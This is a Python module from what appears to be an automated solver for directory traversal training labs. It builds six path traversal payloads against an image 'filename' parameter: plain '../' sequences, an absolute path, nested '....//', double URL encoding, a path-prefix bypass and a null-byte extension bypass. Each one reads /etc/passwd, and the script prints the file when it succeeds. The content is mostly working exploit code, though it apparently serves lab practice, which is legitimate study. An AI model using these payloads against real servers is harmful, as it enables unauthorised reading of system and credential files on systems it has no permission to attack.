import modules.InputOperations as InputOperations
import modules.MenuOperations as MenuOperations
import modules.VisualEffects as VisualEffects
import modules.RequestOperations as request
import modules.Variables as Variables


def menu():
    MenuOperations.vulnerability_labs_menu("Directory_Traversal",  {
        1: "File path traversal, simple case",
        2: "Traversal sequences blocked with absolute path bypass",
        3: "Traversal sequences stripped non-recursively",
        4: "Traversal sequences stripped with superfluous Variables.url-decode",
        5: "Validation of start of path",
        6: "Validation of file extension with null byte bypass"
    })


def solve_lab():
    if(Variables.user_input == 1):
        image_url = Variables.url + "/image?filename=../../../../etc/passwd"
    elif (Variables.user_input == 2):
        image_url = Variables.url + "/image?filename=/etc/passwd"
    elif (Variables.user_input == 3):
        image_url = Variables.url + "/image?filename=....//....//....//etc/passwd"
    elif (Variables.user_input == 4):
        img_url_need_encode = "../../../etc/passwd"
        img_url_encoded = InputOperations.encode_all(img_url_need_encode)
        img_url_double_encoded = InputOperations.encode_all(img_url_encoded)
        image_url = Variables.url + "/image?filename=" + img_url_double_encoded
    elif (Variables.user_input == 5):
        image_url = Variables.url + "/image?filename=/var/www/images/../../../etc/passwd"
    elif (Variables.user_input == 6):
        image_url = Variables.url + "/image?filename=../../../etc/passwd%0048.jpg"

    response = request.session.get(image_url, verify=False, proxies=Variables.proxies)
    if "root:x" in response.text:
        VisualEffects.loading_effect(Variables.attacking_text, 2)
        print("\n[+] attack successfully completed.")
        print("\n==== CONTENT OF THE /etc/passwd FILE ====\n")
        print(response.text)
        print("==== END OF THE /etc/passwd FILE ====")